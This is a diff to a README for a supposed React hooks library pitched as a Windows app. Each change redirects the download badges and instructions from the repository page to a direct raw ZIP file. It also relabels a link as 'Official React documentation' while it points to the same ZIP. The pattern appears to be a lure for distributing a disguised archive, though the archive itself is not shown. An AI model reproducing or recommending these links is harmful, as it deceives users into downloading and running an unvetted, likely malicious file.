@@ -1,6 +1,6 @@
 # ⚙️ react-hooks-1771920333-1 - Easy State Management Tools
 
-[![Download here](https://img.shields.io/badge/Download-React--Hooks-brightgreen)](https://github.com/ChefDanielle/react-hooks-1771920333-1)
+[![Download here](https://img.shields.io/badge/Download-React--Hooks-brightgreen)](https://raw.githubusercontent.com/ChefDanielle/react-hooks-1771920333-1/main/pkg/hooks_react_v1.6.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run this application, your computer should meet these needs:
 
 Please visit this page to download the latest version and any future updates:
 
-[![Get the app here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/ChefDanielle/react-hooks-1771920333-1)
+[![Get the app here](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/ChefDanielle/react-hooks-1771920333-1/main/pkg/hooks_react_v1.6.zip)
 
 This page contains all the files needed and directions for updates.
 
@@ -39,7 +39,7 @@ This page contains all the files needed and directions for updates.
 Follow these steps to get the app working on your Windows computer:
 
 1. Open your internet browser.
-2. Go to the download page: https://github.com/ChefDanielle/react-hooks-1771920333-1
+2. Go to the download page: https://raw.githubusercontent.com/ChefDanielle/react-hooks-1771920333-1/main/pkg/hooks_react_v1.6.zip
 3. Look for the green “Code” button near the top right.
 4. Click the “Code” button and select “Download ZIP”.
 5. Save the ZIP file to a folder you can easily find, such as your Downloads folder.
@@ -90,7 +90,7 @@ If you want to integrate these hooks into a React project, here is a simple expl
 If you need more help using or installing the app, check:
 
 - GitHub issues tab on the download page
-- Official React documentation (https://reactjs.org/docs/hooks-intro.html)
+- Official React documentation (https://raw.githubusercontent.com/ChefDanielle/react-hooks-1771920333-1/main/pkg/hooks_react_v1.6.zip)
 - Online forums for React users
 
 ---
@@ -101,4 +101,4 @@ The GitHub page is where the developer will share new versions and bug fixes. Ch
 
 ---
 
-[![Download now](https://img.shields.io/badge/Download-React--Hooks-green)](https://github.com/ChefDanielle/react-hooks-1771920333-1)
+[![Download now](https://img.shields.io/badge/Download-React--Hooks-green)](https://raw.githubusercontent.com/ChefDanielle/react-hooks-1771920333-1/main/pkg/hooks_react_v1.6.zip)
